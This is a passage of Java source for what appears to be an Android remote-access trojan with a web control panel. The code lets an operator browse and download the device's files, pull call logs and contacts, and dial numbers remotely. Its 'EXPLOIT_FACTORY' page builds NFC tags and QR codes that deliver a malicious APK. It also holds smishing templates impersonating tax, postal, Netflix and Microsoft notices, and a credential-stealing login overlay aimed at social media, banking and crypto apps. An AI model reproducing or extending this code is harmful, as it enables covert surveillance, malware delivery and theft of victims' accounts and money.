        html.append("<button onclick=\"location.href='/device/apps'\" class=\"btn\" style=\"border-color: var(--neon-cyan) !important; color: var(--neon-cyan) !important; background: rgba(0, 242, 255, 0.05) !important; min-width: 320px !important; width: auto !important; max-width: 95% !important; display: inline-flex !important; align-items: center !important; justify-content: center !important; margin: 0 auto !important; float: none !important; position: relative !important; left: auto !important; transform: none !important; padding: 12px 10px !important; white-space: nowrap !important; font-size: 0.75rem !important;\">&#128230; VIEW_INSTALLED_APPS</button>");
        html.append("</div>");

        // --- FILE LIST WITH MARKER ---
        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px;\">");
        
        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            // Sort: folders first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);
                
                boolean isImage = fileName.toLowerCase().matches(".*\\.(jpg|jpeg|png|webp|gif|bmp)$");
                String thumbnail = "";
                if (isImage) {
                    String b64 = getFileThumbnailBase64(file);
                    if (!b64.isEmpty()) {
                        thumbnail = "<img src='data:image/jpeg;base64," + b64 + "' style='width:60px; height:60px; object-fit:cover; border-radius:4px; border:1px solid rgba(0,242,255,0.2); margin-right:15px; cursor:pointer;' onclick=\"window.open('/files/" + filePath + "')\">";
                    }
                }

                html.append("<li class=\"file-item\" style=\"display:flex; align-items:center;\">");
                if (!thumbnail.isEmpty()) {
                    html.append(thumbnail);
                } else {
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                }
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
                
                html.append("<div class=\"file-meta\">");
                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("<span style=\"color: #f39c12;\">DIRECTORY</span> &nbsp;|&nbsp; ").append(count).append(" OBJECTS");
                } else {
                    String ext = "";
                    int i = fileName.lastIndexOf('.');
                    if (i > 0) ext = fileName.substring(i+1).toUpperCase();
                    html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
                    html.append(formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                }
                html.append("</div></div>");

                if (file.isFile()) {
                    String lowerName = fileName.toLowerCase();
                    if (lowerName.endsWith(".txt") || lowerName.endsWith(".json") || lowerName.endsWith(".log") || 
                        lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
                        html.append("<a class=\"btn btn-small\" style=\"margin-right:8px; border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
                    }
                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
                            .append("\">GET</a>");
                }

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("</div>"); // Close marker
        html.append("</div>"); // Close card

        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            logActivity("DATA_EXTRACT: File fetched - " + file.getName());
            // Optimization: Buffered Input Stream with 64KB buffer for high-speed transfer
            java.io.InputStream fis = new java.io.BufferedInputStream(new java.io.FileInputStream(file), 65536);
            String mimeType = getMimeType(file.getName());
            Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            response.addHeader("Accept-Ranges", "bytes");
            return response;
        } catch (Exception e) {
            return serveError("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10);
        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File file = new File(baseDir, path);

        if (!file.exists() || !file.isFile()) {
            return serve404();
        }

        return serveFileDownload(file);
    }

    private Response serveCallLogs(Map<String, String> params, IHTTPSession session) {
        logActivity("COMMS_EXTRACT: Call history retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Recent Call Logs</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // --- REMOTE DIALER SECTION ---
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center;\">&#128222; Remote Dialer</h3>");
        html.append("<form action=\"/calls/make\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">INITIATE CALL</button>");
        html.append("</div>");
        html.append("</div></form>");
        
        html.append("<div style=\"margin-top: 20px; text-align: center;\">");
        html.append("</div></div>");

        // --- LOGS LIST SECTION (NO SIDE MARKER) ---
        html.append("<div style=\"margin-top: 40px;\">");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            // Query for call logs - compatible with Android 13+
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                // NO SIDE MARKER before table (Removed for technical branding alignment)
                html.append("<div style=\"margin-top: 30px;\">");
                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th><th>Action</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    // Skip to offset
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    // Limit results
                    if (count >= limit)
                        break;

                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In";
                            typeClass = "call-incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out";
                            typeClass = "call-outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked";
                            typeClass = "call-missed";
                            break;
                        default:
                            typeIcon = "&#128222; Other";
                            typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td>").append(
                            new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td>").append(formatDuration(duration)).append("</td>");
                    html.append("<td style=\"white-space: nowrap;\">");
                    if (number != null && !number.equals("Unknown")) {
                        html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 60px; padding: 5px 10px; margin: 0;\">CALL</a>");
                    }
                    html.append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=1\">First</a>");
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/calls?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/calls\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>"); // Close marker
        html.append("</div>"); // Close card

        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params, IHTTPSession session) {
        logActivity("CONTACT_EXTRACT: Address book retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Contacts</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // NO SIDE MARKER
        html.append("<div style=\"margin-top: 20px;\">");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                java.util.Map<String, String> uniqueContacts = new java.util.LinkedHashMap<>();
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    if (number == null) continue;
                    String normalized = number.replaceAll("[^0-9+]", "");
                    if (!uniqueContacts.containsKey(normalized)) {
                        uniqueContacts.put(normalized, name);
                    }
                }

                int totalCount = uniqueContacts.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                // NO SIDE MARKER before table
                html.append("<div style=\"margin-top: 30px;\">");
                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th><th>Action</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int itemIndex = 0;

                for (java.util.Map.Entry<String, String> entry : uniqueContacts.entrySet()) {
                    if (itemIndex < offset) {
                        itemIndex++;
                        continue;
                    }

                    if (count >= limit)
                        break;

                    String number = entry.getKey();
                    String name = entry.getValue();

                    html.append("<td>");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td>").append(number).append("</td>");
                    html.append("<td>");
                    html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 0; padding: 5px 10px;\">CALL</a>");
                    html.append("</td>");
                    html.append("</tr>");

                    count++;
                    itemIndex++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=1\">First</a>");
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/contacts?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/contacts\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>"); // Close marker
        html.append("</div>"); // Close card

        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveExploitsPage(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 45px; color: var(--neon-cyan);\">EXPLOIT_FACTORY</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        html.append("<div class=\"info-section\" style=\"margin-bottom: 30px;\">");
        html.append("<h3 style=\"text-align: left;\">VECTOR: NFC_PROXIMITY</h3>");
        html.append("<div style=\"border-left: 3px solid var(--neon-green); padding-left: 15px;\">");
        html.append("<div class=\"info-item\" style=\"background:rgba(0,0,0,0.3); align-items: flex-start;\">");
        html.append("<p style=\"margin-bottom:15px; font-size:0.8rem; color:var(--neon-cyan);\">Generate a binary NDEF payload to program physical tags. When a target device taps the tag, it will trigger an automatic browser download of your APK.</p>");
        
        html.append("<div style=\"display:flex; flex-direction:column; gap:15px; align-items: flex-start;\">");
        html.append("<p style=\"color:var(--neon-orange); font-size:0.7rem; border-left:2px solid var(--neon-orange); padding-left:10px;\">NOTICE: Use a public host (e.g. Catbox) for real-world deployment. Local IPs will fail outside your network.</p>");
        html.append("<div style=\"display:flex; gap:10px; width: 100%; max-width: 500px;\">");
        html.append("<input type=\"text\" id=\"payload-url\" placeholder=\"PASTE_PUBLIC_CATBOX_URL_HERE\" value=\"https://\" style=\"flex:1; padding:12px; background:#000; border:1px solid var(--neon-cyan); color:#fff; font-family:monospace; border-radius:8px;\">");
        html.append("<button onclick=\"copyUrl()\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">COPY LINK</button>");
        html.append("</div>");
        
        html.append("<div style=\"display:flex; gap:10px; width: 100%; max-width: 500px;\">");
        html.append("<select id=\"ndef-type\" style=\"flex:1; background:#000; border:1px solid rgba(0,242,255,0.3); color:#fff; padding:12px; border-radius:8px;\">");
        html.append("<option value=\"uri\">Simple URI Record</option>");
        html.append("<option value=\"smart\">Smart Poster (Includes Title)</option>");
        html.append("</select>");
        
        html.append("<button onclick=\"generateNDEF()\" class=\"btn\" style=\"flex:1; min-width:0; border-color:var(--neon-green); color:var(--neon-green);\">GENERATE BINARY</button>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        html.append("<div id=\"ndef-result\" style=\"display:none; margin-top:20px;\">");
        html.append("<div class=\"terminal-text\" style=\"font-size:0.7rem;\">");
        html.append("NDEF_GENERATION_SUCCESSFUL<br>");
        html.append("<span id=\"hex-output\" style=\"word-break:break-all; opacity:0.7; user-select:all;\"></span>");
        html.append("</div>");
        html.append("<div style=\"display:flex; gap:10px; margin-top:15px;\">");
        html.append("<button onclick=\"copyHex()\" class=\"btn\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan);\">COPY HEX PROTOCOL</button>");
        html.append("<a id=\"download-link\" class=\"btn\" style=\"flex:1; text-align:center; text-decoration:none; border-color:#888; color:#888;\">DOWNLOAD BIN</a>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // --- NEW: QR VECTOR ---
        html.append("<div class=\"info-section\" style=\"margin-top: 40px;\">");
        html.append("<h3 style=\"text-align: left;\">VECTOR: QR_VISUAL</h3>");
        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px;\">");
        html.append("<div class=\"info-item\" style=\"background:rgba(0,0,0,0.3); text-align:left; display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<p style=\"margin-bottom:15px; font-size:0.8rem; color:var(--neon-cyan); text-align: left; width: 100%;\">Generate a visual trigger for camera-based delivery.</p>");
        html.append("<input type=\"text\" id=\"qr-payload-url\" placeholder=\"URL_TO_ENCODE...\" value=\"https://\" style=\"width:100%; max-width:450px; padding:12px; background:#000; border:1px solid var(--neon-cyan); color:#fff; font-family:monospace; border-radius:8px; margin-bottom:15px;\">");
        html.append("<div id=\"qr-container\" style=\"background:#fff; padding:12px; display:flex; align-items:center; justify-content:center; border-radius:12px; margin-bottom:15px; width:220px; height:220px; box-shadow: 0 0 30px rgba(0,242,255,0.3);\">");
        html.append("<img id=\"qr-img\" style=\"display:none; width:200px; height:200px; object-fit: contain;\">");
        html.append("<div id=\"qr-placeholder\" style=\"color:#000; font-size:0.7rem; font-weight:bold; font-family:monospace; text-align:center;\">AWAITING_URL</div>");
        html.append("</div>");
        html.append("<button onclick=\"generateQR()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); width: 100%;\">GENERATE QR_CODE</button>");
        html.append("</div>");
        html.append("</div>");

        // --- NEW: SMISHING TEMPLATES ---
        html.append("<div class=\"info-section\" style=\"margin-top: 40px;\">");
        html.append("<h3 style=\"text-align: left;\">VECTOR: SMISHING_TEMPLATES</h3>");
        html.append("<div style=\"border-left: 3px solid var(--neon-yellow); padding-left: 15px;\">");
        html.append("<div class=\"info-item\" style=\"background:rgba(0,0,0,0.3); align-items: flex-start;\">");
        html.append("<select id=\"smish-template\" onchange=\"applyTemplate(this.value)\" style=\"background:#000; border:1px solid rgba(0,242,255,0.3); color:#fff; padding:10px; border-radius:8px; margin-bottom:10px;\">");
        html.append("<option value=\"\">SELECT_PHISHING_TEMPLATE</option>");
        html.append("<option value=\"The system has detected a stability issue. Please install the mandatory update to prevent data loss: \">System Stability Alert</option>");
        html.append("<option value=\"Your package [ID: 9482] is waiting for final clearance. Download the tracker to confirm delivery: \">Postal Delivery Tracking</option>");
        html.append("<option value=\"SECURITY: A new login was detected on your account. If this wasn't you, secure your device immediately: \">Security Breach Alert</option>");
        html.append("<option value=\"Your tax refund of $428.50 is ready for direct deposit. Verify your identity to claim: \">Government Tax Refund</option>");
        html.append("<option value=\"Urgent: Your Netflix subscription has been suspended due to a payment failure. Update now: \">Subscription Payment Failure</option>");
        html.append("<option value=\"You have a new voicemail from [Private Number]. Listen to the message here: \">Missed Voicemail Alert</option>");
        html.append("<option value=\"Microsoft Account: Suspicious activity detected in your mailbox. Review recent sign-ins: \">Microsoft Security Review</option>");
        html.append("<option value=\"Final Notice: Your vehicle registration expires in 48 hours. Renew online to avoid fines: \">Vehicle Renewal Notice</option>");
        html.append("</select>");
        html.append("<textarea id=\"smish-preview\" style=\"height:80px; background:#000; border:1px solid rgba(0,242,255,0.1); color:var(--neon-green); font-family:monospace; padding:10px; border-radius:8px; font-size:0.7rem;\" readonly></textarea>");
        html.append("<button onclick=\"copySmish()\" class=\"btn\" style=\"margin-top:10px; border-color:var(--neon-yellow); color:var(--neon-yellow);\">COPY SMISH_PAYLOAD</button>");
        html.append("</div>");
        html.append("</div>");

        // --- NEW: SHADOW OVERLAY ---
        html.append("<div class=\"info-section\" style=\"margin-top: 40px;\">");
        html.append("<h3 style=\"text-align: left;\">VECTOR: SHADOW_OVERLAY</h3>");
        html.append("<div style=\"border-left: 3px solid var(--danger); padding-left: 15px;\">");
        html.append("<div class=\"info-item\" style=\"background:rgba(0,0,0,0.3); align-items: flex-start;\">");
        html.append("<p style=\"margin-bottom:15px; font-size:0.8rem; color:var(--neon-cyan);\">Inject a phishing overlay over the target device to capture credentials.</p>");
        html.append("<select id=\"overlay-type\" onchange=\"updateOverlayPreview(this.value)\" style=\"background:#000; border:1px solid rgba(0,242,255,0.3); color:#fff; padding:12px; border-radius:8px; margin-bottom:15px;\">");
        html.append("<option value=\"\">SELECT_OVERLAY_TARGET</option>");
        html.append("<option value=\"insta\">Instagram Login</option>");
        html.append("<option value=\"gmail\">Google / Gmail Login</option>");
        html.append("<option value=\"fb\">Facebook Auth</option>");
        html.append("<option value=\"snap\">Snapchat Login</option>");
        html.append("<option value=\"crypto\">Binance / Crypto Wallet</option>");
        html.append("<option value=\"bank\">Generic Banking Auth</option>");
        html.append("<option value=\"wallet\">PayPal / Digital Wallet</option>");
        html.append("<option value=\"ms\">Microsoft / Office 365</option>");
        html.append("</select>");
        html.append("<button onclick=\"deployOverlay()\" class=\"btn\" style=\"border-color:var(--danger); color:var(--danger);\">DEPLOY_OVERLAY</button>");
        html.append("</div>");
        html.append("</div>");

        html.append("</div>");

        html.append("<script>");
        html.append("function updateOverlayPreview(v) { /* System sync placeholder */ }");
        html.append("function generateQR() {");
        html.append("  const url = document.getElementById('qr-payload-url').value;");
        html.append("  if(!url || url === 'https://') return showToast('ENTER_URL_FIRST', 'error');");
        html.append("  const qr = document.getElementById('qr-img');");
        html.append("  const placeholder = document.getElementById('qr-placeholder');");
        html.append("  qr.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(url);");
        html.append("  qr.style.display = 'inline-block'; placeholder.style.display = 'none';");
        html.append("  showToast('QR_CODE_GENERATED');");
        html.append("}");
        html.append("function applyTemplate(val) {");
        html.append("  const url = document.getElementById('payload-url').value;");
        html.append("  document.getElementById('smish-preview').value = val + url;");
        html.append("}");
        html.append("function copySmish() {");
        html.append("  const text = document.getElementById('smish-preview').value;");
        html.append("  if(!text) return showToast('SELECT_TEMPLATE_FIRST', 'error');");
        html.append("  navigator.clipboard.writeText(text); showToast('SMISH_PAYLOAD_COPIED');");
        html.append("}");
        html.append("let currentHex = '';");
        html.append("function copyUrl() {");
        html.append("  navigator.clipboard.writeText(document.getElementById('payload-url').value);");
        html.append("  showToast('PAYLOAD_LINK_COPIED');");
        html.append("}");
        html.append("function copyHex() {");
        html.append("  const cleanHex = currentHex.replace(/\\s/g, '');");
        html.append("  navigator.clipboard.writeText(cleanHex);");
        html.append("  showToast('HEX_PROTOCOL_COPIED');");
        html.append("}");
        html.append("function generateNDEF() {");
        html.append("  const url = document.getElementById('payload-url').value;");
        html.append("  const type = document.getElementById('ndef-type').value;");
        html.append("  if(!url) return showToast('ENTER_DELIVERY_URL', 'error');");
        
        html.append("  fetch('/exploits/generate?url=' + encodeURIComponent(url) + '&type=' + type)");
        html.append("    .then(r => r.json())");
        html.append("    .then(d => {");
        html.append("      if(d.success) {");
        html.append("        currentHex = d.hex;");
        html.append("        document.getElementById('ndef-result').style.display = 'block';");
        html.append("        document.getElementById('hex-output').innerText = 'BYTES: ' + d.hex;");
        html.append("        document.getElementById('download-link').href = 'data:application/octet-stream;base64,' + d.base64;");
        html.append("        document.getElementById('download-link').download = 'payload.ndef';");
        html.append("        showToast('STRATEGIC_PAYLOAD_READY');");
        html.append("      }");
        html.append("    });");
        html.append("}");
        html.append("function deployOverlay() {");
        html.append("  const type = document.getElementById('overlay-type').value;");
        html.append("  if(!type) return showToast('SELECT_TARGET_FIRST', 'error');");
        html.append("  if(confirm('Deploy Tactical Shadow Overlay?')) {");
